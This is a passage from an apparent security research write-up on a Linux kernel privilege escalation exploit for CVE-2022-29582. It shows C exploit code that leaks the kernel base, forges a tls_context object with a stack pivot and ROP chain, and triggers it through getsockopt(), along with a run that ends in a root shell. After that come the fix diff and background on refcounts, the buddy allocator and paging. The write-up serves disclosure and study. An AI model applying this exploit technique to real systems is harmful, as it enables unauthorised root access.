    <span class="kt">uint64_t</span> <span class="n">kernel_base</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">leak</span><span class="p">[</span><span class="n">RO_PTR_OFF</span><span class="p">]</span> <span class="o">-</span> <span class="n">BASE_OFF</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Current tls_context @ %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">tls_context</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Kernel base @ %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kernel_base</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">mgr</span><span class="o">-&gt;</span><span class="n">leak</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MSG_SIZE</span><span class="p">);</span>

<span class="cp">#define GETSOCKOPT_OFF (40)
#define SK_PROTO_OFF (136)
</span>    <span class="cm">/* Prepare sk_proto overwrite, getsockopt() overwrite,
     * stack pivot, and ROP chain contents. */</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">spray</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">mgr</span><span class="o">-&gt;</span><span class="n">spray</span><span class="p">;</span>
    <span class="n">prepare_rop</span><span class="p">(</span><span class="o">&amp;</span><span class="n">spray</span><span class="p">[</span><span class="mi">8</span><span class="p">],</span> <span class="n">kernel_base</span><span class="p">);</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">spray</span><span class="p">[</span><span class="n">GETSOCKOPT_OFF</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="n">STACK_PIVOT_OFF</span><span class="p">;;</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">spray</span><span class="p">[</span><span class="n">SK_PROTO_OFF</span><span class="p">]</span> <span class="o">=</span> <span class="n">tls_context</span><span class="p">;</span>

    <span class="p">...</span>

    <span class="k">return</span> <span class="n">SUCC</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Finally, we take out all of the information we need, calculate the data we want to overwrite the <code class="language-plaintext highlighter-rouge">tls_context</code> object. To break it down a bit we have two phases in this function:</p>
<ul>
  <li>Leak <code class="language-plaintext highlighter-rouge">tls_context</code> data:
    <ul>
      <li>The address of the <code class="language-plaintext highlighter-rouge">tls_context</code> <code class="language-plaintext highlighter-rouge">list_head</code> <code class="language-plaintext highlighter-rouge">next</code> pointer. This allows us to calculate the address of the <code class="language-plaintext highlighter-rouge">tls_context</code> by subtracting <code class="language-plaintext highlighter-rouge">0x98</code> from <code class="language-plaintext highlighter-rouge">list.next</code>.</li>
      <li>The address of <code class="language-plaintext highlighter-rouge">tcp_prot</code> stored in <code class="language-plaintext highlighter-rouge">sk_proto</code>. This allows us to calculate the kernel base address by subtracting <code class="language-plaintext highlighter-rouge">0x180b660</code> from <code class="language-plaintext highlighter-rouge">&amp;tcp_prot</code>.</li>
    </ul>
  </li>
  <li>Prepare forged <code class="language-plaintext highlighter-rouge">tls_context</code> data:
    <ul>
      <li>To overwrite part of the <code class="language-plaintext highlighter-rouge">tls_context</code> with a set of ROP gadgets.</li>
      <li>To overwrite <code class="language-plaintext highlighter-rouge">sk_proto</code> with the <code class="language-plaintext highlighter-rouge">tls_context</code> address. So now the part of the <code class="language-plaintext highlighter-rouge">tls_context</code> object contains our fake <code class="language-plaintext highlighter-rouge">proto</code> object.</li>
      <li>To overwrite <code class="language-plaintext highlighter-rouge">sk_proto-&gt;getsockopt()</code> with the address of a <strong>stack pivot gadget</strong>, remembering that <code class="language-plaintext highlighter-rouge">sk_proto == &amp;tls_context</code> due to witchcraft. The fake stack will start inside the <code class="language-plaintext highlighter-rouge">tls_context</code> object, specifically where we write our ROP chain.</li>
    </ul>
  </li>
</ul>

<p>Then we‚Äôll reallocate the previously freed <code class="language-plaintext highlighter-rouge">msg_msgseg</code> with our fake <code class="language-plaintext highlighter-rouge">tls_context</code>.</p>

<figure>
<img src="/img/posts/cve-2022-29582/pivot.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>TLS context polymorphism by memory corruption</i></center></figcaption>
</figure>
<p>As we can see, the <code class="language-plaintext highlighter-rouge">tls_context</code> object has taken on multiple roles. It‚Äôs partially a fake <code class="language-plaintext highlighter-rouge">proto</code> object implementing our stack pivoting <code class="language-plaintext highlighter-rouge">getsockopt()</code>. It‚Äôs also partially a fake stack which houses a ROP chain.</p>

<h2 id="code-execution">Code execution</h2>
<p>The final piece of the puzzle is to trigger the stack pivot. We know that calling <code class="language-plaintext highlighter-rouge">getsockopt()</code> on that one lucky socket with that one lucky <code class="language-plaintext highlighter-rouge">tls_context</code> will run the stack pivot code.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">err_t</span> <span class="nf">run_machine</span><span class="p">(</span><span class="k">struct</span> <span class="n">manager</span> <span class="o">*</span><span class="n">mgr</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">spray</span> <span class="o">=</span> <span class="n">mgr</span><span class="o">-&gt;</span><span class="n">spray</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">tls_context</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">spray</span><span class="p">[</span><span class="n">SK_PROTO_OFF</span><span class="p">];</span>
    <span class="kt">uint64_t</span> <span class="n">pivot_stack</span> <span class="o">=</span> <span class="n">tls_context</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">;</span>

    <span class="cm">/* Transfer control inside child task */</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fork</span><span class="p">())</span> <span class="p">{</span>
        <span class="cm">/* Hopefully run along the ROP chain */</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"[+] Calling getsockopt() to trigger execution."</span><span class="p">);</span>
        <span class="n">getsockopt_all_tls</span><span class="p">(</span><span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x42424242</span><span class="p">,</span>
                           <span class="n">pivot_stack</span><span class="p">,</span> <span class="mh">0x8181818181818181</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="cm">/* Busyloop to prevent exit. */</span>
    <span class="k">for</span> <span class="p">(;;);</span>
    <span class="n">__builtin_unreachable</span><span class="p">();</span>
<span class="p">}</span>

<span class="n">err_t</span> <span class="nf">getsockopt_all_tls</span><span class="p">(</span><span class="kt">int</span> <span class="n">level</span><span class="p">,</span> <span class="kt">int</span> <span class="n">name</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">value</span><span class="p">,</span> <span class="kt">void</span><span class="o">*</span> <span class="n">len</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N_TLS_FDS</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">IF_ERR</span><span class="p">(</span><span class="n">tls_fds</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">{</span>
            <span class="n">perror</span><span class="p">(</span><span class="s">"getsockopt_all_tls:fd=-1"</span><span class="p">);</span>
            <span class="k">return</span> <span class="n">ERR</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">getsockopt</span><span class="p">(</span><span class="n">tls_fds</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">level</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">SUCC</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>According to the calling convention on our target machine, we can control all bytes of the <code class="language-plaintext highlighter-rouge">RCX</code> register through the <code class="language-plaintext highlighter-rouge">value</code> argument to <code class="language-plaintext highlighter-rouge">getsockopt()</code>. Our stack pivot gadget, which replaces <code class="language-plaintext highlighter-rouge">getsockopt()</code> in the target, moves the value in <code class="language-plaintext highlighter-rouge">RCX</code> (<code class="language-plaintext highlighter-rouge">tls_context + 0x20</code>) into <code class="language-plaintext highlighter-rouge">RSP</code> (to use this fake stack) and then returns. The ROP chain, sitting at <code class="language-plaintext highlighter-rouge">tls_context + 0x20</code>, begins.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guest@target:~$ ./exp
Listening on 127.0.0.1:9999 (tcp)
[.] Creating TCP socks to upgrade later. 
[+] Successfully won the race, attempting file cross-cache.
[.] Closing non-candidate pipes.                 
[+] Creating file use-after-free.        
[+] Reallocating filp page with cross-cache.  
[+] Freeing file again for a msg_msgseg use-after-free.
[+] Spraying tls_context objects for a leak.                                       
[.] Upgrading socks to TLS to spray.    
[+] Leaking tls_context object.
[.] Printing out the kernel leak.

0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 
0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 
0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 
0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 
0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 
0x0000000000000000 0xdead4ead00000000 0x00000000ffffffff 0xffffffffffffffff 
0x0000000000000000 0xffff935608beaa98 0xffff935608beaa98 0x0000000000000000 
0xffffffffba80b660 0xffff935604b2b900 0x0000000000000000 0x0000000000000000 
0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 
0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 
0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 
0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 

[.] Spraying forged tls_context objects with msg_msgseg.
[+] Current tls_context @ ffff935608beaa00
[+] Kernel base @ ffffffffb9000000
[+] Calling getsockopt() to trigger execution.
[+] Returned to usermode! Root shell is imminent.
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div></div>
<p>To read the source, head to our exploit‚Äôs <a href="https://github.com/Ruia-ruia/CVE-2022-29582-Exploit">repository</a>.</p>

<hr />

<h1 id="the-fix">The fix</h1>
<p>The main component of the fix is below:</p>
<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">@@ -6282,12 +6281,12 @@</span> static enum hrtimer_restart io_link_timeout_fn(struct hrtimer *timer)
        if (!list_empty(&amp;req-&gt;link_list)) {
                prev = list_entry(req-&gt;link_list.prev, struct io_kiocb,
                                  link_list);
<span class="gd">-               if (refcount_inc_not_zero(&amp;prev-&gt;refs))
-                       list_del_init(&amp;req-&gt;link_list);
-               else
</span><span class="gi">+               list_del_init(&amp;req-&gt;link_list);
+               if (!refcount_inc_not_zero(&amp;prev-&gt;refs))
</span>                        prev = NULL;
        }

+       list_del(&amp;req-&gt;timeout.list);
        spin_unlock_irqrestore(&amp;ctx-&gt;completion_lock, flags);

        if (prev) {
</code></pre></div></div>

<hr />

<h1 id="mitigations-against-exploitation">Mitigations against exploitation</h1>
<p>Immediately launch a full-scale <a href="https://dune.fandom.com/wiki/Butlerian_Jihad">Butlerian Jihad</a> against anything stronger than a deterministic finite automaton. Failing this, update your kernel.</p>

<hr />

<h1 id="appendix">Appendix</h1>

<h2 id="references">References</h2>
<p>A <strong>reference</strong> is a relationship between a referrer and a referee. Typically this is just a pointer from one object to another. There is this idea in program correctness of ‚Äúdangling references‚Äù or ‚Äústale pointers‚Äù. When a pointee is destroyed and another object retains a pointer to it then there is a risk that the pointing object will follow the stale pointer to a stale pointee.</p>

<p>A <code class="language-plaintext highlighter-rouge">refcount_t refs</code> field is embedded in each <code class="language-plaintext highlighter-rouge">io_kiocb</code> in order to manage references explicitly. This is just a wrapper around an atomic variable of type <code class="language-plaintext highlighter-rouge">int</code>. When we need to refer to an object from another object we increment the pointee‚Äôs <code class="language-plaintext highlighter-rouge">refcount</code>. When we don‚Äôt need the reference anymore we decrement it.</p>

<p>Of course, we could just use a raw C integral type as some other kernel data structures indeed do. But the <code class="language-plaintext highlighter-rouge">refcount_t</code> wrapper offers additional protection as it conforms to <strong>refcount saturation semantics</strong>. These ensure that the refcount stays within correct bounds and warns us if the refcount (and therefore reference) is behaving weirdly:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="nl">REFCOUNT_ADD_NOT_ZERO_OVF:</span>
		<span class="n">REFCOUNT_WARN</span><span class="p">(</span><span class="s">"saturated; leaking memory"</span><span class="p">);</span>

	<span class="n">REFCOUNT_ADD_OVF</span><span class="o">:</span>
		<span class="n">REFCOUNT_WARN</span><span class="p">(</span><span class="s">"saturated; leaking memory"</span><span class="p">);</span>

	<span class="n">REFCOUNT_ADD_UAF</span><span class="o">:</span>
		<span class="n">REFCOUNT_WARN</span><span class="p">(</span><span class="s">"addition on 0; use-after-free"</span><span class="p">);</span>

	<span class="n">REFCOUNT_SUB_UAF</span><span class="o">:</span>
		<span class="n">REFCOUNT_WARN</span><span class="p">(</span><span class="s">"underflow; use-after-free"</span><span class="p">);</span>

	<span class="n">REFCOUNT_DEC_LEAK</span><span class="o">:</span>
		<span class="n">REFCOUNT_WARN</span><span class="p">(</span><span class="s">"decrement hit 0; leaking memory"</span><span class="p">);</span>
</code></pre></div></div>
<p>But refcounts do more than warn us. By only accessing the <code class="language-plaintext highlighter-rouge">refs</code> field through the refcount API <code class="language-plaintext highlighter-rouge">refcount_inc(&amp;req-&gt;refs)</code>, <code class="language-plaintext highlighter-rouge">refcount_dec(&amp;req-&gt;refs)</code>, etc. we also prevent things like double-frees since once an object is freed because its refcount is <code class="language-plaintext highlighter-rouge">0</code> the API ensures it can‚Äôt be freed again.</p>

<h2 id="the-simplified-buddy-algorithm">The (simplified) buddy algorithm</h2>
<p>In the Linux kernel page allocator implementation pages are grouped into zones. Inside zones, however, they‚Äôre organised on two main bases. One is the migration type which determines whether a page can be repurposed to maintain contiguity for a new allocation - meaning its contents have to be moved out of there. More importantly for us is the <code class="language-plaintext highlighter-rouge">free_area[]</code>. This is an array of 11 lists - one for each order.</p>

<p>We can consider the <code class="language-plaintext highlighter-rouge">zone</code>, the <code class="language-plaintext highlighter-rouge">order</code>, and the <code class="language-plaintext highlighter-rouge">free_area[i]</code> list to be data for the buddy algorithm. The (simplified) buddy algorithm is defined as follows.</p>

<p>Assume all inputs are well-formed.
Assume at least <code class="language-plaintext highlighter-rouge">free_area[10]</code> is non-empty.</p>

<p>Given input:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">order</code></li>
  <li><code class="language-plaintext highlighter-rouge">zone</code>
    <ol>
      <li>Set <code class="language-plaintext highlighter-rouge">L</code> to be <code class="language-plaintext highlighter-rouge">zone-&gt;free_area[order]-&gt;list</code>.</li>
      <li>If <code class="language-plaintext highlighter-rouge">L</code>  has a block, remove it from the list and return it. We were successful.</li>
      <li>If <code class="language-plaintext highlighter-rouge">L</code> is empty, then we are in the search state. In this state we keep searching larger-order lists until we find a non-empty one.</li>
      <li>Once we find a non-empty list, let that list be called <code class="language-plaintext highlighter-rouge">Lk</code>. Remove the first block from it, denoted by <code class="language-plaintext highlighter-rouge">B</code>.</li>
      <li>If <code class="language-plaintext highlighter-rouge">k == order</code> then our search is over, return <code class="language-plaintext highlighter-rouge">B</code>.</li>
      <li>If <code class="language-plaintext highlighter-rouge">k != order</code>  then we need to split <code class="language-plaintext highlighter-rouge">B</code> and so we are in the split state. In this state we:</li>
    </ol>
    <ul>
      <li>Split <code class="language-plaintext highlighter-rouge">B</code> in half: <code class="language-plaintext highlighter-rouge">B1</code> and <code class="language-plaintext highlighter-rouge">B2</code>.</li>
      <li><code class="language-plaintext highlighter-rouge">B1</code> goes on the <code class="language-plaintext highlighter-rouge">k - 1</code>th list.</li>
      <li><code class="language-plaintext highlighter-rouge">B2</code> is our candidate block.</li>
      <li>Set <code class="language-plaintext highlighter-rouge">B</code> to <code class="language-plaintext highlighter-rouge">B2</code>.</li>
      <li>Set <code class="language-plaintext highlighter-rouge">k</code> to <code class="language-plaintext highlighter-rouge">k - 1</code></li>
      <li>goto 5.</li>
    </ul>
  </li>
</ul>

<p>Note that when we can‚Äôt find a suitable object on the list for our given <code class="language-plaintext highlighter-rouge">order</code>, we attempt to find one by splitting an item from the <code class="language-plaintext highlighter-rouge">order + 1</code> list into two halves. These halves are called ‚Äúbuddies‚Äù. This tells us where the algorithm got its name. But more importantly, it has a bearing on the inverse operation. When both buddies are freed back to the page allocator, they are coalesced and moved up to the <code class="language-plaintext highlighter-rouge">order + 1</code> list, recursively. While one is allocated, however, the other remains in the <code class="language-plaintext highlighter-rouge">order</code> list, waiting for its buddy so they can one day return to the <code class="language-plaintext highlighter-rouge">order + 1</code>, then maybe to <code class="language-plaintext highlighter-rouge">order + 2</code>, <code class="language-plaintext highlighter-rouge">order + 3</code>, and so on.</p>

<p>For an interesting discussion on gaming the buddy allocator see <a href="https://etenal.me/archives/1825">this article</a> on page allocator Feng Shui.</p>

<h2 id="paging-background">Paging: background</h2>
<p>Pages are cool because they enable paging which enables <strong>address space virtualisation</strong>. With this, we abstract away from the complex details of physical memory management towards a more coherent, flexible, and secure memory layer.</p>

<p>A virtual address space is comprised of <strong>virtual pages</strong>. These in turn map to <strong>physical page frames</strong> represented by the infamous <code class="language-plaintext highlighter-rouge">struct page</code>. When a process attempts to access memory, the computer must first translate the virtual access into the correct physical access. The virtual address, in combination with data gleaned from the paging data structures, specifies the underlying page frame and some offset into this page frame. In other words, the <strong>paging</strong> subsystem produces and resolves mappings between virtual addresses and physical addresses. There may be many virtual pages mapped to the same physical page frame.</p>

<h2 id="paging-motivation">Paging: motivation</h2>
<p>Paging has numerous advantages and use-cases.</p>
<ul>
  <li>The paging system takes responsibity for address space management away from individual processes and instead makes the kernel deal with it. Each process believes that it has sole ownership over the system memory and so does not need to include explicit logic to protect itself from other processes or to ensure that it doesn‚Äôt trample on anybody else.</li>
  <li>Paging enables per-page userspace vs. kernelspace separation. A page can be marked as user-accessible or kernel-accessible. E.g. when a userspace application attempts to access kernel memory, a fault is issued ‚Äì well, maybe not before this <a href="https://meltdownattack.com/">transient access is cached</a> ;) .</li>
  <li>Paging enables page-grained permissions such as read/write/execute. Thus, a page can contain non-executable but readable/writeable data (as in a function stack). Or it can contain executable and readable but non-writeable data (as in the code part of a process image).</li>
  <li>Paging enables the kernel to <strong>swap</strong> a page‚Äôs contents out to disk if we are running low on space and to swap it back in when we need it.</li>
</ul>

<h2 id="paging-method">Paging: method</h2>
<p>To actually get at the physical memory, we need to combine a given virtual address with data retrieved from the paging data structures. These data structures are collectively called <strong>page tables</strong>. In most modern systems we use <strong>multi-level page tables</strong>.</p>

<figure>
<img src="/img/posts/cve-2022-29582/paging.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Translating a virtual address to the corresponding page frame number</i></center></figcaption>
</figure>
<p>Apart from being nice to look at, this diagram does also mean something. The idea is that a virtual address is comprised of a bunch of indices (A, B, C, D, E for us). But indices of what?</p>

<p>At the top level, A is an index into our process‚Äô <strong>Page Global Directory</strong>. The value at this index is the location of the relevant <strong>Page Upper Directory</strong>. Then we use B as an index into the <strong>PUD</strong>. The value at this index locates the <strong>Page Middle Directory</strong> which we then peer into with C. This takes us finally to a set of <strong>Page Table Entries</strong> which, combined with D, give us a <strong>page table entry</strong>. The page table entry maps directly to the infamous: <strong>page</strong> or rather, its <strong>page frame number</strong>. But a vague 4096 sized block of memory isn‚Äôt usually what we‚Äôre after when we access an address, give us a byte! So finally we use E as an index into the target page frame.</p>

<p>While the kernel can programmatically resolve a page frame from a virtual address, it is almost always specialised hardware which actively traverses the page tables. On some systems, this is known as the <strong>Memory Management Unit</strong> but is typically integrated directly into the CPU. On x86, when we perform a <strong>context switch</strong>, the physical address of the process‚Äô <code class="language-plaintext highlighter-rouge">mm-&gt;pgd</code> is loaded into the <code class="language-plaintext highlighter-rouge">CR3</code> register. This flushes out any residue page tables in the paging cache (<strong>Translation Lookaside Buffer</strong>). The MMU then starts its translation by reading off the root of the process‚Äô page table tree: that PGD reference stored in <code class="language-plaintext highlighter-rouge">CR3</code>.</p>

<blockquote>
  <p>The first paging structure used for any translation is located at the physical address in CR3. A linear address is translated using the following iterative procedure. A portion of the linear address (initially the uppermost bits) selects an entry in a paging structure (initially the one located using CR3). If that entry references another paging structure, the process continues with that paging structure and with the portion of the linear address immediately below that just used. If instead the entry maps a page, the process completes: the physical address in the entry is that of the page frame and the remaining lower portion of the linear address is the page offset (<a href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html">Intel¬Æ 64 and IA-32 Architectures Software Developer Manuals section 4.2, Volume 3A</a>)</p>
</blockquote>

<p>If the MMU can‚Äôt find the corresponding page table entry then it raises a page fault. The kernel can handle this either by adding a new page table entry mapping a virtual address to the desired physical address for future lookups (<strong>demand paging</strong>), or it can bail out ‚Äì having determined that the access is illegal.</p>
:ET